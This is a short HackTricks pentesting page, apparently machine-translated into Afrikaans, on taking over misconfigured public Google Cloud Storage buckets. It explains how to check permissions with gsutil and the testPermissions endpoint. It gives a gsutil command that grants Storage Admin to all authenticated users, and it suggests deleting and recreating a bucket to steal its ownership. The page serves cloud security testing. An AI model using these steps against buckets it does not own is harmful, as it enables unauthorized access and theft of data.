# GCP - Publieke Emmers Privilege Escalatie

{{#include ../../../../banners/hacktricks-training.md}}

## Emmers Privilege Escalatie

As die emmerbeleid “allUsers” of “allAuthenticatedUsers” toegelaat het om **na hulle emmerbeleid te skryf** (die **storage.buckets.setIamPolicy** toestemming)**,** dan kan enige iemand die emmerbeleid verander en homself volle toegang gee.

### Kontroleer Toestemmings

Daar is 2 maniere om die toestemmings oor 'n emmer te kontroleer. Die eerste een is om dit te vra deur 'n versoek te maak na `https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam` of deur `gsutil iam get gs://BUCKET_NAME` te loop.

As jou gebruiker (potensieel behoort aan "allUsers" of "allAuthenticatedUsers") egter nie toestemming het om die iam beleid van die emmer te lees (storage.buckets.getIamPolicy) nie, sal dit nie werk nie.

Die ander opsie wat altyd sal werk, is om die testPermissions eindpunt van die emmer te gebruik om uit te vind of jy die gespesifiseerde toestemming het, byvoorbeeld toegang tot: `https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam/testPermissions?permissions=storage.buckets.delete&permissions=storage.buckets.get&permissions=storage.buckets.getIamPolicy&permissions=storage.buckets.setIamPolicy&permissions=storage.buckets.update&permissions=storage.objects.create&permissions=storage.objects.delete&permissions=storage.objects.get&permissions=storage.objects.list&permissions=storage.objects.update`

### Eskalering

Om `Storage Admin` aan `allAuthenticatedUsers` toe te ken, is dit moontlik om te loop:
```bash
gsutil iam ch allAuthenticatedUsers:admin gs://BUCKET_NAME
```
Another attack would be to **verwyder die emmer en dit weer in jou rekening te herskep om die eienaarskap te steel**.

## References

- [https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/](https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/)

{{#include ../../../../banners/hacktricks-training.md}}
